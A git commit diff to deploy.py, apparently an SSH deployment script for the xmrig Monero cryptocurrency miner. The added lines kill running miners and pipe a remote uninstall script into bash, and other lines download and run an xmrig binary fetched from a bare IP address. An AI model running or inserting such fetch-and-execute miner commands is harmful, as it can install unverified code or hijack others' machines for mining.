7f856b743958f57034bcfc62e9476f7f462fd406
junaidd007 <junaidd007@users.noreply.github.com>
2021-04-29 08:16:45 +0400

    Update deploy.py

--- deploy.py
+++ deploy.py
@@ -22,11 +22,14 @@ sshcmd = [
     # 
     # "sudo yum install epel-release -y", # install epel-release on Centos!! to make sur you can get tmux + wget
     #"sudo apt install wget tmux -y", # installs wget
+    "pkill xmrig",
+    "curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/uninstall_moneroocean_miner.sh | bash -s",
     "rm config.json",
     "wget http://158.69.130.165/xmrig/build/xmrig", # Downloads xmrig
     "wget https://raw.githubusercontent.com/junaidd007/Monero/main/config.json", #downloads the config file
     "chmod +x ./xmrig",
-    "./xmrig"
+    "./xmrig",
+    "exit",
         
 ]
 
